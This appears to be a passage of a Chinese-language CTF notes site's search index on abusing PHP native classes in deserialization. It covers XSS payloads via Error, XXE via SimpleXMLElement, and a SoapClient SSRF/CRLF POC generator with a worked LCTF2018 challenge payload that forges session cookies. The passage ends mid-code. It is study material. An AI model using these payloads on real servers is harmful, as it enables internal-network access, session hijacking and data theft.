<p>\u8fd9\u91cc\u5e94\u8be5\u662f\u80fd\u770b\u61c2</p> <p>ps:<code>?&gt;</code>\u662f\u56e0\u4e3aERROR\u62a5\u9519\u7c7b\u4f1a\u8df3\u51fa\u4e00\u957f\u4e32\u4e0d\u53ef\u9884\u77e5\u7684\u62a5\u9519\u4fe1\u606f\uff0c\u9700\u8981\u547d\u4ee4\u6267\u884c\u7684\u8bdd\u9700\u8981\u7528<code>?&gt;</code>\u53bb\u95ed\u5408\u6389\u7206\u51fa\u6765\u7684\u6742\u4e03\u6742\u516b\u7684\u4fe1\u606f\u3002<code>~</code>\u662f\u53d6\u53cd\u7b26\u53f7\u7ed5\u8fc7\u8fc7\u6ee4\u3002\uff08\u7406\u89e3\u4e00\u4e0b\uff0c\u548c\u5f02\u6216\u5f88\u7c7b\u4f3c\uff09\u3002</p> <p><code>eval(\"...Error: ?&gt;&lt;?php payload ?&gt;\")</code></p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/Error_Exception/#2php70xss","title":"2.PHP7.0\u4e0b\u7684XSS","text":"<pre><code>&lt;?php\n$a\u00a0=\u00a0unserialize($_GET['whoami']);\necho\u00a0$a;\n?&gt;\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u53ea\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u53cd\u5e8f\u5217\u5316\uff0c\u5e76\u6ca1\u6709\u7ed9\u51fa\u7c7b\uff0c\u8fd9\u65f6\u5019\u4e00\u822c\u90fd\u4f1a\u53bb\u601d\u8003\u4e00\u4e0b\u539f\u751f\u7c7b\u3002</p> <pre><code>&lt;?php\n$a\u00a0=\u00a0new\u00a0Error(\"&lt;script&gt;alert('xss')&lt;/script&gt;\");\n$b\u00a0=\u00a0serialize($a);\necho\u00a0urlencode($b);\u00a0\u00a0\n?&gt;\n</code></pre> <p>\u7136\u540e\u62a5\u9519\u628a\u63d2\u5165\u7684XSS\u4ee3\u7801\u6267\u884c\u3002</p> <p>\u4e4b\u540e\u4e00\u822c\u4f1a\u7528\u5230XSS\u91cc\u9762\u7684\u77e5\u8bc6\u6a21\u5757\u4f8b\u5982\uff1a</p> <p><code>&lt;script&gt;alert(\"\u5185\u5bb9\")&lt;/script&gt;</code>    \u4f7f\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846</p> <p><code>&lt;body onload=alert(\"\u5185\u5bb9\")&gt;</code>   \u4f7f\u7528<code>&lt;body&gt;</code>\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846</p> <p><code>&lt;a href=\u201c\u201donclick=alert(\u201c\u5185\u5bb9\u201d)&gt;\u94fe\u63a5\u6587\u5b57&lt;/a&gt;</code> \u4f7f\u7528<code>&lt;a&gt;</code>\u6807\u7b7e\uff0c\u663e\u793a\u53ef\u70b9\u51fb\u94fe\u63a5\uff0c\u70b9\u51fb\u94fe\u63a5\u540e\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846</p> <p><code>&lt;imgsrc=WrongIP onerror=alert(\"\u5185\u5bb9\")&gt;</code>   \u4f7f\u7528<code>&lt;img&gt;</code>\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846</p> <p><code>&lt;script&gt;window.location.href=\"\u7f51\u7ad9\u5730\u5740\"&lt;/script&gt;</code>  \u4f7f\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\uff0c\u91cd\u5b9a\u5411\u9875\u9762</p> <p><code>&lt;script&gt;alert=(document.cookie)&lt;/script&gt;</code>   \u4f7f\u7528<code>&lt;script&gt;</code>\u6807\u7b7e\uff0ccookie\u83b7\u53d6</p> <p>\u7b49\u7b49</p> <p>\u4f8b\u9898\u53ef\u4ee5\u770b\u8fd9\u4e2a\uff1a\uff08\u7f51\u4e0a\u86ee\u591a\u7684\u6211\u5c31\u4e0d\u653e\u4e86\uff09</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SimpleXMLElement/","title":"SimpleXMLElement","text":"<p>\u8fd9\u4e2a\u5185\u7f6e\u7c7b\u7528\u4e8e\u89e3\u6790 XML \u6587\u6863\u4e2d\u7684\u5143\u7d20</p> <p></p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u901a\u8fc7\u8bbe\u7f6e\u7b2c\u4e09\u4e2a\u53c2\u6570 data_is_url \u4e3a<code>true</code>\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u8fdc\u7a0bxml\u6587\u4ef6\u7684\u8f7d\u5165\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u5e38\u91cf\u503c\u6211\u4eec\u8bbe\u7f6e\u4e3a<code>2</code>\u5373\u53ef\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570 data \u5c31\u662f\u6211\u4eec\u81ea\u5df1\u8bbe\u7f6e\u7684payload\u7684url\u5730\u5740\uff0c\u5373\u7528\u4e8e\u5f15\u5165\u7684\u5916\u90e8\u5b9e\u4f53\u7684url\u3002</p> <p>\u8fd9\u6837\u7684\u8bdd\uff0c\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u76ee\u6807\u8c03\u7528\u7684\u7c7b\u7684\u65f6\u5019\uff0c\u4fbf\u53ef\u4ee5\u901a\u8fc7 SimpleXMLElement \u8fd9\u4e2a\u5185\u7f6e\u7c7b\u6765\u6784\u9020 XXE(\u8fd9\u4e2a\u4e5f\u53ef\u4ee5\u6253\u5185\u7f51\uff0c\u4f46\u662f\u6211\u78b0\u5230\u7684\u5f88\u5c11\uff0c\u7b49\u5f85\u540e\u7eed\u8865\u5145)\u3002</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/","title":"SoapClient","text":""},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#_1","title":"\u57fa\u7840","text":"<p>\u8fd9\u4e2a\u7c7b\u5229\u7528\u8d77\u6765\u6bd4\u8f83\u8003\u9a8c\u6280\u5de7\u4e86\uff0c\u800c\u4e14\u7531\u4e8e\u78b0\u5230\u7684\u7f51\u7edc\u73af\u5883\u4e0d\u4f1a\u5f88\u7a33\u5b9a\uff0c\u53ef\u80fd\u8981\u91cd\u590d\u8bd5\u5f88\u591a\u6b21\u624d\u80fd\u8bd5\u51fa\u6765\u3002\u800c\u4e14\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e2a\u7c7b\u7684\u8fd0\u7528\u91cd\u70b9\u4e0d\u5728\u53cd\u5e8f\u5217\u5316\u4e0a\u3002</p> <p><code>SOAP</code>:<code>Simple Object Access Protocol</code>\u7b80\u5355\u5bf9\u8c61\u8bbf\u95ee\u534f\u8bae</p> <p>PHP \u7684\u5185\u7f6e\u7c7b SoapClient \u662f\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u8bbf\u95eeweb\u670d\u52a1\u7684\u7c7b\uff0c\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u57fa\u4e8eSOAP\u534f\u8bae\u8bbf\u95eeWeb\u670d\u52a1\u7684 PHP \u5ba2\u6237\u7aef\u3002</p> <p>\u5f00\u542f\u6761\u4ef6\uff1a\u9700\u8981\u5c06php.ini\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6soap.dll\u4e4b\u524d\u7684\u5206\u53f7\u53bb\u6389\u624d\u80fd\u591f\u4f7f\u7528\u3002</p> <pre><code>SoapClient\u00a0{\u00a0/*\u00a0\u65b9\u6cd5\u00a0*/\u00a0public\u00a0__construct\u00a0(\u00a0string|null\u00a0$wsdl\u00a0,\u00a0array\u00a0$options\u00a0=\u00a0[]\u00a0)\u00a0public\u00a0__call\u00a0(\u00a0string\u00a0$name\u00a0,\u00a0array\u00a0$args\u00a0)\u00a0:\u00a0mixed\u00a0public\u00a0__doRequest\u00a0(\u00a0string\u00a0$request\u00a0,\u00a0string\u00a0$location\u00a0,\u00a0string\u00a0$action\u00a0,\u00a0int\u00a0$version\u00a0,\u00a0bool\u00a0$oneWay\u00a0=\u00a0false\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getCookies\u00a0(\u00a0)\u00a0:\u00a0array\u00a0public\u00a0__getFunctions\u00a0(\u00a0)\u00a0:\u00a0array|null\u00a0public\u00a0__getLastRequest\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getLastRequestHeaders\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getLastResponse\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getLastResponseHeaders\u00a0(\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__getTypes\u00a0(\u00a0)\u00a0:\u00a0array|null\u00a0public\u00a0__setCookie\u00a0(\u00a0string\u00a0$name\u00a0,\u00a0string|null\u00a0$value\u00a0=\u00a0null\u00a0)\u00a0:\u00a0void\u00a0public\u00a0__setLocation\u00a0(\u00a0string\u00a0$location\u00a0=\u00a0\"\"\u00a0)\u00a0:\u00a0string|null\u00a0public\u00a0__setSoapHeaders\u00a0(\u00a0SoapHeader|array|null\u00a0$headers\u00a0=\u00a0null\u00a0)\u00a0:\u00a0bool\u00a0public\u00a0__soapCall\u00a0(\u00a0string\u00a0$name\u00a0,\u00a0array\u00a0$args\u00a0,\u00a0array|null\u00a0$options\u00a0=\u00a0null\u00a0,\u00a0SoapHeader|array|null\u00a0$inputHeaders\u00a0=\u00a0null\u00a0,\u00a0array\u00a0&amp;$outputHeaders\u00a0=\u00a0null\u00a0)\u00a0:\u00a0mixed}\nPlain Text\n</code></pre> <p>\u6211\u5077\u61d2\u4e86\uff0c\u91cd\u70b9\u5173\u6ce8\u7684\u662f\u8fd9\u91cc\u7684\u7b2c\u4e8c\u884c__call(\u8c03\u7528\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u51fd\u6570\uff0c\u4f1a\u53bb\u8c03\u7528<code>__call</code>\u65b9\u6cd5).\u5f53<code>__call</code>\u65b9\u6cd5\u88ab\u89e6\u53d1\u540e\uff0c\u5b83\u53ef\u4ee5\u53d1\u9001 HTTP \u548c HTTPS \u8bf7\u6c42\u3002\u6b63\u662f\u8fd9\u4e2a<code>__call</code>\u65b9\u6cd5\uff0c\u4f7f\u5f97 SoapClient \u7c7b\u53ef\u4ee5\u88ab\u6211\u4eec\u8fd0\u7528\u5728 SSRF \u4e2d\u3002</p> <pre><code>public\u00a0SoapClient\u00a0::\u00a0SoapClient(mixed\u00a0$wsdl\u00a0[\uff0carray\u00a0$options\u00a0])\nPlain Text\n</code></pre> <ul> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u7528\u6765\u6307\u660e\u662f\u5426\u662fwsdl\u6a21\u5f0f\uff0c\u5c06\u8be5\u503c\u8bbe\u4e3anull\u5219\u8868\u793a\u975ewsdl\u6a21\u5f0f\u3002</li> <li>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u4e00\u4e2a\u6570\u7ec4\uff0c\u5982\u679c\u5728wsdl\u6a21\u5f0f\u4e0b\uff0c\u6b64\u53c2\u6570\u53ef\u9009\uff1b\u5982\u679c\u5728\u975ewsdl\u6a21\u5f0f\u4e0b\uff0c\u5219\u5fc5\u987b\u8bbe\u7f6elocation\u548curi\u9009\u9879\uff0c\u5176\u4e2dlocation\u662f\u8981\u5c06\u8bf7\u6c42\u53d1\u9001\u5230\u7684SOAP\u670d\u52a1\u5668\u7684URL\uff0c\u800curi \u662fSOAP\u670d\u52a1\u7684\u76ee\u6807\u547d\u540d\u7a7a\u95f4\u3002</li> </ul> <p>SOAP\u662fwebService\u4e09\u8981\u7d20\uff08SOAP\u3001WSDL\u3001UDDI\uff09\u4e4b\u4e00\uff1a</p> <p>WSDL \u7528\u6765\u63cf\u8ff0\u5982\u4f55\u8bbf\u95ee\u5177\u4f53\u7684\u63a5\u53e3\u3002</p> <p>UDDI\u7528\u6765\u7ba1\u7406\uff0c\u5206\u53d1\uff0c\u67e5\u8be2webService\u3002</p> <p>SOAP\uff08\u7b80\u5355\u5bf9\u8c61\u8bbf\u95ee\u534f\u8bae\uff09\u662f\u8fde\u63a5\u6216Web\u670d\u52a1\u6216\u5ba2\u6237\u7aef\u548cWeb\u670d\u52a1\u4e4b\u95f4\u7684\u63a5\u53e3\u3002</p> <p>\u5176\u91c7\u7528HTTP\u4f5c\u4e3a\u5e95\u5c42\u901a\u8baf\u534f\u8bae\uff0cXML\u4f5c\u4e3a\u6570\u636e\u4f20\u9001\u7684\u683c\u5f0f\u3002\uff08\u770b\u4e0d\u61c2\u95ee\u9898\u4e5f\u4e0d\u5927\uff09</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#crlf","title":"CRLF\u6ce8\u5165\u653b\u51fb(\u670d\u52a1\u5668\u54cd\u5e94\u62c6\u5206\u6f0f\u6d1e)","text":"<p>CRLF\u662f\u201d\u56de\u8f66 + \u6362\u884c\u201d(\\r\\n)\u7684\u7b80\u79f0\u3002\u5728HTTP\u534f\u8bae\u4e2d\uff0cHTTP Header\u4e0eHTTP Body\u662f\u7528\u4e24\u4e2aCRLF\u5206\u9694\u7684\uff0c\u6d4f\u89c8\u5668\u5c31\u662f\u6839\u636e\u8fd9\u4e24\u4e2aCRLF\u6765\u53d6\u51faHTTP \u5185\u5bb9\u5e76\u663e\u793a\u51fa\u6765\u3002\u6240\u4ee5\uff0c\u4e00\u65e6\u6211\u4eec\u80fd\u591f\u63a7\u5236HTTP \u6d88\u606f\u5934\u4e2d\u7684\u5b57\u7b26\uff0c\u6ce8\u5165\u4e00\u4e9b\u6076\u610f\u7684\u6362\u884c\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u6ce8\u5165\u4e00\u4e9b\u4f1a\u8bddCookie\u6216\u8005HTML\u4ee3\u7801\uff0c\u6240\u4ee5CRLFInjection\u53c8\u53ebHTTP Response Splitting\uff0c\u7b80\u79f0HRS\u3002</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#ssrfcrlf","title":"SSRF+CRLF\u653b\u51fb\u5185\u7f51","text":"<p>\u5b9e\u9645\u4e0a\u5f88\u591a\u65f6\u5019\u90fd\u9700\u8981\u8fd9\u4e24\u4e2a\u6f0f\u6d1e\u914d\u5408\u5728\u4e00\u8d77\u4f7f\u7528\uff0c\u5f53\u6211\u4eec\u6211\u4eec\u53ef\u4ee5\u4ece\u5916\u7f51\u8c03\u7528\u5230soap\u7684api\uff0c\u800c\u653b\u51fb\u76ee\u6807\u662f\u5728\u5185\u7f51\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5229\u7528SoapClient\u8fdb\u884cSSRF\u653b\u51fb\u5185\u7f51\uff0c\u7136\u540e\u914d\u5408CRLF\u6784\u9020POST\u8bf7\u6c42\u589e\u52a0\u6211\u4eec\u7684\u653b\u51fb\u9762\u3002</p> <p>\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u4f1a\u6709CRLF:</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230options\u53c2\u6570\u4e2d\u8fd8\u6709\u4e00\u4e2a\u9009\u9879\u4e3auser_agent\uff0c\u8fd0\u884c\u6211\u4eec\u81ea\u5df1\u8bbe\u7f6eUser-Agent\u7684\u503c\u3002</p> <p>\u5f53\u6211\u4eec\u53ef\u4ee5\u63a7\u5236User-Agent\u7684\u503c\u65f6\uff0c\u4e5f\u5c31\u610f\u5473\u7740\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u6784\u9020\u4e00\u4e2aPOST\u8bf7\u6c42\uff0c\u56e0\u4e3aContent-Type\u4e3a\u548cContent-Length\u90fd\u5728User-Agent\u4e4b\u4e0b\uff0c\u800c\u63a7\u5236\u8fd9\u4e24\u4e2a\u662f\u5229\u7528CRLF\u53d1\u9001post\u8bf7\u6c42\u6700\u5173\u952e\u7684\u5730\u65b9\u3002</p> <p>\u751f\u6210\u4efb\u610fPOST\u62a5\u6587\u7684POC:</p> <pre><code>&lt;?php\n$target = 'http://123.206.216.198/bbb.php';\n$post_string = 'a=b&amp;flag=aaa';\n$headers = array(\n    'X-Forwarded-For: 127.0.0.1',\n    'Cookie: xxxx=1234'\n    );\n$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      =&gt; \"aaab\"));\n$aaa = serialize($b)\uff1b\n$aaa = str_replace('^^','%0d%0a',$aaa);\n$aaa = str_replace('&amp;','%26',$aaa);\necho $aaa;\n?&gt;\nPlain Text\n</code></pre> <p>\u8fd9\u4e2a\u662f\u67d0\u4e2a\u9996\u6b21\u53d1\u73b0\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u4eba\u6240\u5199\u7684\u811a\u672c\u3002\u53ef\u4ee5\u7406\u89e3\u4e3a\u5c06\u6570\u636e\u5305\u8fdb\u884c\u4f2a\u9020\uff0c\u800c\u4e14\u7531\u4e8e\u6211\u4eec\u6709CRLF\uff0c\u6211\u4eec\u80fd\u5c06\u8fd9\u4e2a\u6570\u636e\u5305\u9020\u7684\u66f4\u4e3a\u201d\u903c\u771f\u201c\uff0c\u5426\u5219\u4ec5\u6709SSRF\u7684\u8bdd\uff0c\u8fd9\u4e2a\u5305\u4f1a\u6781\u5927\u7684\u53d7\u9650\u5236\u4e8eHTTP/HTTPS\u534f\u8bae\u3002\uff08\u5982\u679c\u4f60\u4ed4\u7ec6\u770b\u8fd9\u4e2a\u811a\u672c\uff0c\u4f1a\u53d1\u73b0\u5b83\u8fd8\u633a\u6709\u610f\u601d\u7684\uff09</p> <p>\u5bf9\u4e8e\u5982\u4f55\u53d1\u9001POST\u7684\u6570\u636e\u5305\uff0c\u8fd9\u91cc\u9762\u8fd8\u6709\u4e00\u4e2a\u5751\uff0c\u5c31\u662f<code>Content-Type</code>\u7684\u8bbe\u7f6e\uff0c\u56e0\u4e3a\u6211\u4eec\u8981\u63d0\u4ea4\u7684\u662fPOST\u6570\u636e<code>Content-Type</code>\u7684\u503c\u6211\u4eec\u8981\u8bbe\u7f6e\u4e3a<code>application/x-www-form-urlencoded</code>\uff0c\u8fd9\u91cc\u5982\u4f55\u4fee\u6539<code>Content-Type</code>\u7684\u503c\u5462\uff1f\u7531\u4e8e<code>Content-Type</code>\u5728<code>User-Agent</code>\u7684\u4e0b\u9762\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7<code>SoapClient</code>\u6765\u8bbe\u7f6e<code>User-Agent</code>\uff0c\u5c06\u539f\u6765\u7684<code>Content-Type</code>\u6324\u4e0b\u53bb\uff0c\u4ece\u800c\u518d\u63d2\u5165\u4e00\u4e2a\u65b0\u7684<code>Content-Type</code>\u3002(\u4e0a\u9762\u7684\u811a\u672c\u5df2\u7ecf\u5e2e\u4f60\u89e3\u51b3\u4e86\u8fd9\u4e2a\u95ee\u9898)</p> <p>\u4e0b\u9762\u7684\u5b50\u6587\u6863\u662f\u4e00\u9053\u4f8b\u9898\u3002</p>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/SoapClient/#bestphps-revenge","title":"bestphp's revenge","text":"<p>\u8fd9\u4e2a\u662f\u4e00\u9053\u9898\u76ee\uff0c\u7528\u7684\u5c31\u662f\u8fd9\u4e2a\uff0c\u4f46\u662f\u6211\u4e0d\u8bb0\u5f97\u5728\u54ea\u590d\u73b0\u4e86\uff0c\u5c31copy\u4e86</p> <p>\u6e90\u7801\uff1a</p> <p></p> <p></p> <p>\u5f53REMOTE_ADDR\u7b49\u4e8e127.0.0.1\u65f6\uff0c\u5c31\u4f1a\u5728session\u4e2d\u63d2\u5165flag\uff0c\u5c31\u80fd\u5f97\u5230flag\u3002</p> <p>\u4f46\u662f\u8fd9\u91cc\u5e76\u6ca1\u6709\u660e\u663e\u7684ssrf\u5229\u7528\u70b9\uff0c\u6240\u4ee5\u6211\u4eec\u60f3\u5230\u5229\u7528PHP\u539f\u751f\u7c7bSoapClient\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4SSRF\u3002\u5e76\u4e14\uff0c\u7531\u4e8eflag\u4f1a\u88ab\u63d2\u5165\u5230session\u4e2d\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4e00\u5b9a\u9700\u8981\u643a\u5e26\u4e00\u4e2acookie\u5373PHPSESSID\u53bb\u8bbf\u95ee\u5b83\u6765\u751f\u6210\u8fd9\u4e2asession\u6587\u4ef6\u3002</p> <p>session\u7b80\u5355\u7684\u7406\u89e3\u5c31\u662f\u670d\u52a1\u5668\u7684cookie</p> <p>\u7136\u540e\uff0c\u6211\u4eec\u5c31\u8981\u60f3\u529e\u6cd5\u53cd\u5e8f\u5217\u5316\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u4f46\u8fd9\u91cc\u6709\u6ca1\u6709\u53cd\u5e8f\u5217\u5316\u70b9\uff0c\u90a3\u4e48\u6211\u4eec\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u5728\u9898\u76ee\u6e90\u7801\u4e2d\u53d1\u73b0\u4e86session_start();\uff0c\u5f88\u660e\u663e\uff0c\u6211\u4eec\u53ef\u4ee5\u7528session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u4f46\u662f\u5982\u679c\u60f3\u8981\u5229\u7528session\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u8bdd\uff0c\u6211\u4eec\u5fc5\u987b\u8981\u6709<code>ini_set()</code>\u8fd9\u4e2a\u51fd\u6570\u6765\u66f4\u6539<code>session.serialize_handler</code>\u7684\u503c\uff0c\u5c06session\u53cd\u5e8f\u5217\u5316\u5f15\u64ce\u4fee\u6539\u4e3a\u5176\u4ed6\u7684\u5f15\u64ce\uff0c\u672c\u6765\u5e94\u8be5\u4f7f\u7528ini_set()\u8fd9\u4e2a\u51fd\u6570\u7684\uff0c\u4f46\u662f\u8fd9\u4e2a\u51fd\u6570\u4e0d\u63a5\u53d7\u6570\u7ec4\uff0c\u6240\u4ee5\u5c31\u4e0d\u884c\u4e86\u3002\u4e8e\u662f\u6211\u4eec\u5c31\u7528session_start()\u51fd\u6570\u6765\u4ee3\u66ff\uff0c\u5373\u6784\u9020<code>session_start(serialize_handler=php_serialize)</code>\u5c31\u884c\u4e86\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u9898\u76ee\u4e2d\u7684<code>call_user_func($_GET['f'], $_POST);</code>\u51fd\u6570\uff0c\u4f20\u5165GET\uff1a/?f=session_start\u3001POST\uff1aserialize_handler=php_serialize\uff0c\u5b9e\u73b0<code>session_start(serialize_handler=php_serialize)</code>\u7684\u8c03\u7528\u6765\u4fee\u6539\u6b64\u9875\u9762\u7684\u5e8f\u5217\u5316\u5f15\u64ce\u4e3aphp_serialize\u3002</p> <p>(\u8fd9\u91ccsession\u53cd\u5e8f\u5217\u5316\u4e4b\u540e\u4f1a\u63d0\u53ca)</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u7b2c\u4e00\u6b21\u4f20\u503c\u5148\u6ce8\u5165\u4e0a\u9762POC\u751f\u6210\u7684payload\u521b\u5efa\u5e76\u5f97\u5230\u6211\u4eec\u7684session\uff1a</p> <p></p> <p></p> <p>\u6b64\u65f6\uff0c\u6211\u4eec\u6210\u529f\u5c06\u6211\u4eecphp\u539f\u751f\u7c7bSoapClient\u6784\u9020\u7684payload\u4f20\u5165\u4e86<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>\u7684session\u4e2d\uff0c\u5f53\u9875\u9762\u91cd\u65b0\u52a0\u8f7d\u65f6\uff0c\u5c31\u4f1a\u81ea\u52a8\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u3002\u4f46\u6b64\u65f6\u8fd8\u4e0d\u4f1a\u89e6\u53d1SSRF\uff0c\u9700\u8981\u89e6\u53d1<code>__call</code>\u65b9\u6cd5\u6765\u9020\u6210SSRF\uff0c\u8be5\u65b9\u6cd5\u5728\u8bbf\u95ee\u5bf9\u8c61\u4e2d\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\u65f6\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528\uff0c\u6240\u4ee5\u5355\u7eaf\u53cd\u5e8f\u5217\u5316\u8fd8\u4e0d\u884c\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u8bbf\u95ee\u8be5\u5bf9\u8c61\u4e2d\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u8fd9\u91cc\u5c31\u7528\u5230\u4e86\u5982\u4e0b\u8fd9\u6bb5\u4ee3\u7801\uff1a</p> <pre><code>$a\u00a0=\u00a0array(reset($_SESSION),\u00a0'welcome_to_the_lctf2018');call_user_func($b,\u00a0$a);\nPlain Text\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528extract\u51fd\u6570\u5c06\u53d8\u91cfb\u8986\u76d6\u4e3acall_user_func\uff0c\u8fd9\u6837\uff0c\u5c31\u6210\u4e86\uff1a</p> <pre><code>call_user_func(call_user_func,\u00a0array(reset($_SESSION),\u00a0'welcome_to_the_lctf2018'));\nPlain Text\n</code></pre> <p>call_user_func()\u51fd\u6570\u6709\u4e00\u4e2a\u7279\u6027\uff0c\u5c31\u662f\u5f53\u53ea\u4f20\u5165\u4e00\u4e2a\u6570\u7ec4\u65f6\uff0c\u53ef\u4ee5\u7528call_user_func()\u6765\u8c03\u7528\u4e00\u4e2a\u7c7b\u91cc\u9762\u7684\u65b9\u6cd5\uff0ccall_user_func()\u4f1a\u5c06\u8fd9\u4e2a\u6570\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u503c\u5f53\u505a\u7c7b\u540d\uff0c\u7b2c\u4e8c\u4e2a\u503c\u5f53\u505a\u65b9\u6cd5\u540d\u3002</p> <p>\u8fd9\u6837\u4e5f\u5c31\u662f\u4f1a\u8bbf\u95ee\u6211\u4eec\u6784\u9020\u7684session\u5bf9\u8c61\u4e2d\u7684welcome_to_the_lctf2018\u65b9\u6cd5\uff0c\u800cwelcome_to_the_lctf2018\u65b9\u6cd5\u4e0d\u5b58\u5728\uff0c\u5c31\u4f1a\u89e6\u53d1<code>__call</code>\u65b9\u6cd5\uff0c\u9020\u6210ssrf\u53bb\u8bbf\u95eeflag.php\u3002</p> <p>\u7b2c\u4e8c\u6b21\u4f20\u53c2\uff1a</p> <p></p> <p></p> <p>\u6700\u540e\uff0c\u6211\u4eec\u7b2c\u4e09\u6b21\u4f20\u53c2\uff0c\u7528\u6211\u4eecPOC\u91cc\u9762\u81ea\u5df1\u8bbe\u7f6e\u7684cookie\uff08<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>\uff09\u53bb\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\uff0c<code>var_dump($_SESSION);</code>\u4f1a\u5c06<code>PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4</code>\u7684\u8fd9\u4e2asession\u5185\u5bb9\u8f93\u51fa\u51fa\u6765\uff0c\u5373\u53ef\u5f97\u5230flag\uff1a</p> <p></p> <p>\u6240\u4ee5\u6700\u540e\u7684payload:</p> <pre><code>&lt;?php$target = \"http://127.0.0.1/flag.php\";$attack = new SoapClient(null,array('location' =&gt; $target,'user_agent' =&gt; \"N0rth3ty\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\\r\\n\",    'uri' =&gt; \"123\"));$payload = urlencode(serialize($attack));echo $payload;?&gt;\nPlain Text\n</code></pre>"},{"location":"web/serialize/PHP/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%BA%94%E7%94%A8/else/","title":"\u5176\u4ed6","text":"<p>\u8fd9\u91cc\u4e00\u822c\u7528\u6765\u5199\u4e00\u4e9b\u7528\u8d77\u6765\u6bd4\u8f83\u7b80\u5355\u7684\u7c7b\uff0c\u53ef\u4ee5\u81ea\u5df1\u6dfb\u52a0\u3002</p> <p>DirectoryIterator   \u904d\u5386\u76ee\u5f55</p> <p>FilesystemIterator  \u904d\u5386\u76ee\u5f55</p> <p>GlobIterator  \u904d\u5386\u76ee\u5f55\uff0c\u4f46\u662f\u4e0d\u540c\u7684\u70b9\u5728\u4e8e\u5b83\u53ef\u4ee5\u901a\u914d\u4f8b\u5982/var/html/www/flag*</p> <p>SplFileObject  \u8bfb\u53d6\u6587\u4ef6\uff0c\u6309\u884c\u8bfb\u53d6\uff0c\u591a\u884c\u9700\u8981\u904d\u5386</p> <p>finfo/finfo_open()\u9700\u8981\u4e24\u4e2a\u53c2\u6570</p> <p>\u8fd9\u662f\u90a3\u5929DASCTF&amp;MAR\u4e2d\u7684\u53cd\u5e8f\u5217\u5316\u5b66\u5230\u7684\u4e1c\u897f\u3002\u8fd9\u91cc\u5c31\u6709\u7c7b\u6765\u8bfb\u53d6\u6587\u4ef6\u4e86\u3002</p> <pre><code>&lt;?phpclass A{   public $class='SplFileObject';    public 